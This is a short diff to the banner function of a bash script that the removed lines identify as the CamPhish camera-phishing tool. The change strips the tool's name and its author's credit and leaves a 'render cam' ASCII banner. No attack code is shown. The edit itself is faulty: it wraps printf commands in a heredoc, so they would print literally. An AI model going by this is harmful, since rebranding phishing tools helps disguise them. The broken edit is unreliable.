@@ -29,18 +29,15 @@ fi
 trap 'printf "\n";stop' 2
 
 banner() {
-clear
+    cat << EOF
 printf "\e[1;92m                     _           \e[0m\e[1;77m                     \e[0m\n"
 printf "\e[1;92m                    | |          \e[0m\e[1;77m                     \e[0m\n"
 printf "\e[1;92m  _ __ ___ _ __   __| | ___ _ __ \e[0m\e[1;77m  ___ __ _ _ __ ___  \e[0m\n"
 printf "\e[1;92m | '__/ _ \ '_ \ / _` |/ _ \ '__|\e[0m\e[1;77m / __/ _` | '_ ` _ \ \e[0m\n"
 printf "\e[1;92m | | |  __/ | | | (_| |  __/ |   \e[0m\e[1;77m| (_| (_| | | | | | |\e[0m\n"
 printf "\e[1;92m |_|  \___|_| |_|\__,_|\___|_|   \e[0m\e[1;77m \___\__,_|_| |_| |_|\e[0m\n"
-printf " \e[1;93m CamPhish Ver 2.0 \e[0m \n"
-printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
 
-printf "\n"
-
+EOF
 }
 
 dependencies() {
